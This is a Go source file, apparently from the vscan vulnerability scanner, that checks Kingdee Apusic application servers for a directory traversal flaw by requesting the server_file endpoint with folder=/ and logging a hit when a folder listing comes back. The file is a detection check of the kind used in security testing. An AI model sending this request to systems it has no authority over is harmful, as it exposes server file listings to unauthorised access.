package apusic

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)

//金蝶OA Apusic应用服务器(中间件) server_file 目录遍历漏洞

func Server_file(u string) bool {
	if req, err := pkg.HttpRequset(u+"/admin/protected/selector/server_file/files?folder=/", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "folder") {
			pkg.GoPocLog(fmt.Sprintf("Found vuln 金蝶OA Apusic应用服务器(中间件) server_file 目录遍历漏洞 |%s\n", u+"/admin/protected/selector/server_file/files?folder=/"))
			return true
		}
	}
	return false
}
